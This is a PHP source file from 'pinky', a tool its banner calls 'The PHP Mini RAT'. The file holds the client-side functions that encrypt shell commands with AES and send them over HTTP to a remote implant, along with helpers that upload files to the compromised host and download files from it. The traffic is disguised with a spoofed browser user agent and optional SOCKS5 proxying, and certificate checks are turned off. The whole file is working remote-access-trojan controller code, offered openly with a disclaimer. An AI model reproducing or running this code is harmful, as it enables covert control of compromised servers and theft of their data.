<?php

function build_request($cmd, $path, $key, $iv)
{
    $data     = array(
        'p' => base64_encode($path)
    );
    $position = strpos($cmd, 'pinky:');
    if ($position === false) {
        $data['c'] = encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv);
    } else {
        $cmd    = str_replace('pinky:', '', $cmd);
        $input  = explode(' ', $cmd);
        $action = $input[0];
        array_shift($input);
        if ($action == 'upload') {
            $data['f']      = array(); // files
            $data['f']['u'] = array(); // urls
            $data['f']['b'] = array(); // binaries
            foreach ($input as $entry) {
                if (filter_var($entry, FILTER_VALIDATE_URL)) {
                    $parsed = parse_url($entry);
                    $name   = base64_encode(basename($parsed['path']));
                    $url    = base64_encode($entry);
                    $array  = array(
                        'n' => encrypt_decrypt('encrypt', $name, $key, $iv),
                        'p' => encrypt_decrypt('encrypt', $url, $key, $iv)
                    );
                    array_push($data['f']['u'], $array);
                } else {
                    $file = file_to_base64($entry);
                    if (!is_null($file)) {
                        $name  = base64_encode(basename(realpath($entry)));
                        $array = array(
                            'n' => encrypt_decrypt('encrypt', $name, $key, $iv),
                            'p' => encrypt_decrypt('encrypt', $file, $key, $iv)
                        );
                        array_push($data['f']['b'], $array);
                    } else {
                        echo " [!] ERROR: {$entry} doesn't exists or isn't readable.\n";
                    }
                }
            }
        } elseif ($action == 'download') {
            $data['f']      = array();
            $data['f']['d'] = array(); // files to download
            foreach ($input as $entry) {
                $name = base64_encode($entry);
                array_push($data['f']['d'], encrypt_decrypt('encrypt', $name, $key, $iv));
            }
        }
    }
    return $data;
}

function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
{
    $url_components = parse_url($url);
    $b              = 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0';
    $query          = http_build_query($data);
    $headers        = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection: Keep-Alive',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0',
        'Authorization: Basic ' . base64_encode("{$login}:{$password}"),
        'Content-Type: application/x-www-form-urlencoded',
        'Host: ' . $url_components['host']
    );
    if (!is_null($cookies)) {
        $headers[] = 'Cookie: ' . $cookies;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $b);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if (count($proxy) > 0) {
        if ($url_components['host'] != 'localhost' && $url_components['host'] != '127.0.0.1') {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']);
            if (isset($proxy['type'])) {
                if (strtolower($proxy['type']) != 'http') {
                    if (strtolower($proxy['type']) == 'socks5') {
                        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                    }
                }
            }
        }
    }

    $result = curl_exec($ch);
    if ($result === false) {
        echo "\n\t" . curl_error($ch) . " ¯\_(ツ)_/¯\n\n";
    }

    $info = curl_getinfo($ch);
    curl_close($ch);

    return array(
        'status' => $info['http_code'],
        'content' => $result
    );
}

function encrypt_decrypt($action, $string, $secret_key, $secret_iv)
{
    $output         = false;
    $encrypt_method = "AES-256-CBC";
    $key            = hash('sha256', $secret_key);
    $iv             = substr(hash('sha256', $secret_iv), 0, 16);
    if ($action == 'encrypt') {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } else if ($action == 'decrypt') {
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

function is_json_valid($config)
{
    if (is_null($config) || !isset($config['key']) || !isset($config['iv']) || !isset($config['url']) || !isset($config['login'])) {
        return false;
    }

    if (!isset($config['login']['username']) || !isset($config['login']['password'])) {
        return false;
    }

    return true;
}

function file_to_base64($file)
{
    if (file_exists($file) && is_readable($file)) {
        return base64_encode(file_get_contents($file));
    }
    return null;
}

function base64_to_file($base64_string, $path, $output_file)
{
    if (!is_writable($path)) {
        return null;
    }
    $complete_path = $path . '/' . $output_file;
    $handle        = fopen($complete_path, "wb");
    fwrite($handle, base64_decode($base64_string));
    fclose($handle);
    return $output_file;
}

function print_help($version)
{
    $author  = "David Tavarez";
    $twitter = "@davidtavarez";
    $web     = "https://davidtavarez.github.io/";

    $banner = <<<EOT
        _       _          
  _ __ (_)_ __ | | ___   _ 
 | '_ \| | '_ \| |/ / | | |
 | |_) | | | | |   <| |_| |
 | .__/|_|_| |_|_|\_\\__,  |
 |_|                 |___/  v{$version}

EOT;
    echo chr(27) . chr(91) . 'H' . chr(27) . chr(91) . 'J'; //^[H^[J
    echo "\e[1m";
    echo $banner;
    echo "\e[0m";
    echo " The PHP Mini RAT.\n\n";
    echo " \e[91m+ Author\e[0m: {$author}\n";
    echo " \e[91m+ Twitter\e[0m: {$twitter}\n";
    echo " \e[91m+ Website\e[0m: {$web}\n\n";

    $warning = <<<EOT
 +[\e[91mWARNING\e[0m\e[93m]------------------------------------------+
 | DEVELOPERS ASSUME NO LIABILITY AND ARE NOT        |
 | RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY    |
 | THIS PROGRAM  ¯\_(ツ)_/¯                          |
 +---------------------------------------------------+
 
EOT;
    echo "\e[93m";
    echo $warning;
    echo "\e[0m";
    echo "\n";

}
